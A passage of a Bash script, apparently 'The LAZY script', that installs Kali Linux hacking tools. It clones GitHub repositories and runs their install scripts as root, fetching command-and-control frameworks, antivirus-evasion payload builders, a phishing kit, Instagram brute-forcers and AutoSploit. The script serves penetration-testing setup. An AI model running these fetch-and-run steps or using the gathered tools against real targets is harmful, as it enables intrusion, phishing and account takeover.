		if [[ -f /root/ngrok || -f /root/ngrok.zip ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -f /root/ngrok
			rm -f /root/ngrok.zip
		fi
		rm -f /root/ngrok.zip
		cd
		echo -e "Downloading Ngrok"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --output-document=/root/ngrok.zip
		echo -e "Unzipping Ngrok"
		unzip /root/ngrok.zip
	}
	function install_netdiscover
	{
		apt-get install -y netdiscover	
	}
	function install_websploit
	{
		apt-get install -y websploit
	}
	function install_openvas
	{
		apt-get install -y openvas
		openvas-setup
	}
	function install_shellter
	{
		apt-get install -y shellter
	}
	function install_geany
	{
		apt-get install -y geany
	}
	function install_bleachbit
	{
		apt-get install -y bleachbit
	}
	function install_vmr
	{
		if [[ -d /root/mdk3-v6 || -d /root/VMR ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/mdk3-v6
			if [[ -f /root/VMR-MDK-K2-2017R-012x2.zip ]]
			then
				rm /root/VMR-MDK-K2-2017R-012x2.zip
			fi
			if [[ -d /root/VMR ]]
			then
				rm -r /root/VMR
			fi
		fi
		cd
		wget https://github.com/musket33/VMR-MDK-Kali2-Kali2016/raw/master/VMR-MDK-K2-2017R-012x2.zip
		unzip /root/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR
		cp -r /root/VMR/mdk3-v6 /root/
		cd /root/mdk3-v6
		make
		make install
		chmod 755 /root/mdk3-v6/*
		chmod +x /root/VMR/*.sh
		cd
	}
	function install_hashbuster
	{
		foldname="Hash-Buster"
		gitlink="https://github.com/UltimateHackers/Hash-Buster.git"
		install_default
	}
	function install_findsploit
	{
		foldname="Findsploit"
		gitlink="https://github.com/1N3/Findsploit.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x install.sh
			./install.sh
		fi
	}
	function install_howdoi
	{
		pip install howdoi
		pip2.7 install howdoi
	}
	function install_operative
	{
		foldname="operative-framework"
		gitlink="https://github.com/graniet/operative-framework.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
		fi
	}
	function install_netattack2
	{

		foldname="netattack2"
		gitlink="https://github.com/chrizator/netattack2.git"
		install_default
	}
	function install_koadic
	{
		foldname="koadic"
		gitlink="https://github.com/zerosum0x0/koadic.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
		fi
	}
	function install_empire
	{
		foldname="Empire"
		gitlink="https://github.com/EmpireProject/Empire.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x setup/install.sh
			cd setup
			./install.sh
			./setup_database.py
		fi
	}
	function install_meterpreter_paranoid_mode
	{
		foldname="Meterpreter_Paranoid_Mode-SSL"
		gitlink="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git"
		install_default
	}
	function install_dropit_frmw
	{
		foldname="Dr0p1t-Framework"
		gitlink="https://github.com/D4Vinci/Dr0p1t-Framework.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			cd
			git clone $gitlink
			chmod 777 -R Dr0p1t-Framework
			cd Dr0p1t-Framework
			chmod +x install.sh
			./install.sh
		fi
	}
	function install_wifi_pumpkin
	{
		foldname="WiFi-Pumpkin"
		gitlink="https://github.com/P0cL4bs/WiFi-Pumpkin.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			./installer.sh --install
		fi
	}
	function install_veil
	{
		foldname="Veil"
		gitlink="https://github.com/Veil-Framework/Veil.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			cd setup
			./setup.sh -c
		fi
	}
	function install_leviathan
	{
		foldname="leviathan"
		gitlink="https://github.com/leviathan-framework/leviathan.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements
			pip2.7 install -r requirements
		fi
	}
	function install_fake_image
	{
		foldname="FakeImageExploiter"
		gitlink="https://github.com/r00t-3xp10it/FakeImageExploiter.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x *.sh
		fi
	}
	function install_avet
	{
		foldname="avet"
		gitlink="https://github.com/govolution/avet.git"
		install_default
	}
	function install_gloom
	{
		foldname="Gloom-Framework"
		gitlink="https://github.com/StreetSec/Gloom-Framework.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			python install.py
		fi
	}
	function install_arcanus
	{
		foldname="ARCANUS"
		gitlink="https://github.com/EgeBalci/ARCANUS.git"
		install_default
	}
	function install_msfpc
	{
		apt-get install -y msfpc
	}
	function install_morphhta
	{
		foldname="morphHTA"
		gitlink="https://github.com/vysec/morphHTA.git"
		install_default
	}
	function install_lfi
	{
		foldname="LFISuite"
		gitlink="https://github.com/D35m0nd142/LFISuite.git"
		install_default
	}
	function install_unibyav
	{
		foldname="UniByAv"
		gitlink="https://github.com/Mr-Un1k0d3r/UniByAv.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			apt-get install -y mingw-w64
		fi
	}
	function install_demiguise
	{
		foldname="demiguise"
		gitlink="https://github.com/nccgroup/demiguise.git"
		install_default
	}
	function install_dkmc
	{
		foldname="DKMC"
		gitlink="https://github.com/Mr-Un1k0d3r/DKMC.git"
		install_default
	}
	function install_sechub
	{
		foldname="secHub"
		gitlink="https://github.com/cys3c/secHub.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			python installer.py
			chmod +x /usr/bin/sechub
		fi
	}
	function install_beef
	{
		apt-get install beef-xss
	}
	function install_mitmf
	{
		apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
		foldname="MITMf"
		gitlink="https://github.com/byt3bl33d3r/MITMf"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			git submodule init
			git submodule update --recursive
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
		fi
	}
	function install_arp_scan
	{
		apt-get -y install arp-scan
	}
	function install_netool
	{
		foldname="opensource"
		gitlink="https://github.com/r00t-3xp10it/netool-toolkit"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x INSTALL.sh && ./INSTALL.sh
		fi
	}
	function install_sqlmap
	{
		apt-get install sqlmap
	}
	function install_patator
	{
		foldname="patator"
		gitlink="https://github.com/lanjelot/patator.git"		
		install_default
	}
	function install_zeus
	{
		foldname="Zeus-Scanner"
		gitlink="https://github.com/Ekultek/Zeus-Scanner.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
		fi
	}
	function install_evil_droid
	{
		foldname="Evil-Droid"
		gitlink="https://github.com/M4sc3r4n0/Evil-Droid.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x evil-droid
		fi
	}
	function install_nosqlmap
	{
		foldname="NoSQLMap"
		gitlink="https://github.com/codingo/NoSQLMap.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			python setup.py install
		fi
	}
	function install_eggshell
	{
		foldname="EggShell"
		gitlink="https://github.com/neoneggplant/EggShell.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			easy_install pycrypto
			python eggshell.py
		fi
	}
	function install_zerodoor
	{
		foldname="Zerodoor"
		gitlink="https://github.com/Souhardya/Zerodoor.git"
		install_default
		cloned=$?
	}
	function install_objection
	{
		pip3 install objection
		foldname="objection"
		gitlink="https://github.com/sensepost/objection.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			python setup.py
		fi
	}
	function install_cromos
	{
		foldname="cromos"
		gitlink="https://github.com/evilsocketbr/cromos.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			python setup.py
		fi
	}
	function install_fsociety
	{
		foldname="fsociety"
		gitlink="https://github.com/Manisso/fsociety.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x install.sh
			./install.sh
		fi
	}
	function install_yuki-chan
	{
		foldname="Yuki-Chan-The-Auto-Pentest"
		gitlink="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod 777 wafninja joomscan install-perl-module.sh yuki.sh
			chmod 777 Module/WhatWeb/whatweb
			pip install -r requirements.txt
			chmod +x *.sh
			./install-perl-module.sh
		fi
	}
	function install_socialfish
	{
		foldname="SocialFish"
		gitlink="https://github.com/UndeadSec/SocialFish.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
		fi
	}
	function install_autosploit
	{
		foldname="AutoSploit"
		gitlink="https://github.com/NullArray/AutoSploit.git"
		install_default
	}
	function install_blazy
	{
		foldname="Blazy"
		gitlink="https://github.com/UltimateHackers/Blazy.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
		fi
	}
	function install_striker
	{
		foldname="Striker"
		gitlink="https://github.com/UltimateHackers/Striker.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
		fi
	}
	function install_hyprpulse
	{
		foldname="hyprPulse"
		gitlink="https://github.com/Ethical-H4CK3R/hyprPulse.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x install.sh
			pip2.7 install -r requirements.txt
			./install.sh
			
		fi
	}
	function install_instaburst
	{
		foldname="InstaBurst"
		gitlink="https://github.com/Ethical-H4CK3R/InstaBurst.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			chmod +x install.sh
			pip2.7 install -r requirements.txt
			./install.sh
			
		fi
	}
	function install_sitebroker
	{
		foldname="SiteBroker"
		gitlink="https://github.com/Anon-Exploiter/SiteBroker"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install -r requirements.txt
			pip2.7 install -r requirements.txt
		fi
	}
	function install_enigma
	{
		foldname="Enigma"
		gitlink="https://github.com/UndeadSec/Enigma.git"
		install_default
	}
	function install_datasploit
	{
		foldname="datasploit"
		gitlink="https://github.com/DataSploit/datasploit.git"
		install_default
		cloned=$?
		if [[ "$cloned" == 1 ]]
		then
			pip install --upgrade --force-reinstall -r requirements.txt
			pip2.7 install --upgrade --force-reinstall -r requirements.txt
		fi
	}
	function install_instagram-py
	{
		if [[ -f /usr/local/bin/instagram-py ]]
		then
			echo -e ""$YS"Upgrading..."$CE""
			pip3 install instagram-py --upgrade
		else
			echo -e ""$YS"Installing..."$CE""
			easy_install3 -U pip
			pip3 install requests --upgrade
			pip3 install requests[socks]
			pip3 install stem
			pip3 install instagram-py
			instagram-py --create-configuration
		fi
	}

		
#------------------------------------
####################################
defaults_l
printf '\033]2;The LAZY script\a'
if [[ "$ONETIMEPERLAUNCH" != "1" ]]
then
	one_time_per_launch_ks
fi
####################################
if [[ -f ""$LPATH"/IAGREE.txt" ]]
then

	if [[ ! -f ""$LPATH"/wlan.txt" ]]
	then
		set_interface_number
	fi
	if [[ ! -f ""$LPATH"/wlanmon.txt" ]]
	then
		set_interface_number
	fi
	if [[ ! -f ""$LPATH"/eth.txt" ]]
	then
		set_interface_number
	fi
	clear
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	WLANN=$(cat "$LPATH"/wlan.txt)
	ETH=$(cat "$LPATH"/eth.txt)	
#setting iftop's interface
	if [[ -f "$LPATH"/settings/iftopint.txt ]]
	then
		read iftopint < "$LPATH"/settings/iftopint.txt
	else
		iftopint="$WLANN"
	fi
	export iftopint
	export WLANNM
	export WLANN
	export ETH
	managed_spaces
	monitor_spaces
	if [[ ! -f "$LPATH"/latestchangelog.txt ]]
	then
		echo -e "1" > "$LPATH"/latestchangelog.txt
		latest_changelog
	fi		
	banner
	main_options
	if [[ "$BACKL" = "1" ]]
	then
		exec bash "$0"
		
	else
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi
else
	terms_of_use
fi
